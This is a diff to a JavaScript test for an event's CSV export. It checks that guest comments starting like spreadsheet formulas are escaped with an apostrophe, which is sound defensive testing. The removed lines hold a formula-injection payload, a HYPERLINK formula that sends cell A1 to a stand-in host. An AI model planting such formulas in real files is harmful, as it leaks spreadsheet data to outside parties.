@@ -66,7 +66,7 @@ describe('the CSV exports of an event', () => {
       body: {
         rating: 4,
         startedAt: '2026-01-01T00:00:00.000Z',
-        generalComment: '=HYPERLINK("https://example.test/?d="&A1;"Mehr")',
+        generalComment: '=VERKETTEN("Bar";" 2")',
         commentPositive: '@SUMME(1+1)',
         commentImprovement: '-2+3',
         newsletterOptin: true,
@@ -85,7 +85,7 @@ describe('the CSV exports of an event', () => {
   it('puts an apostrophe in front of guest text that starts like a formula', async () => {
     const csv = await download('/export.csv');
 
-    expect(csv).toContain(`"'=HYPERLINK(""https://example.test/?d=""&A1;""Mehr"")"`);
+    expect(csv).toContain(`"'=VERKETTEN(""Bar"";"" 2"")"`);
     expect(csv).toContain(`"'@SUMME(1+1)"`);
     expect(csv).toContain(`"'-2+3"`);
     expect(csv).toContain(`"'+++ Silvester +++"`);
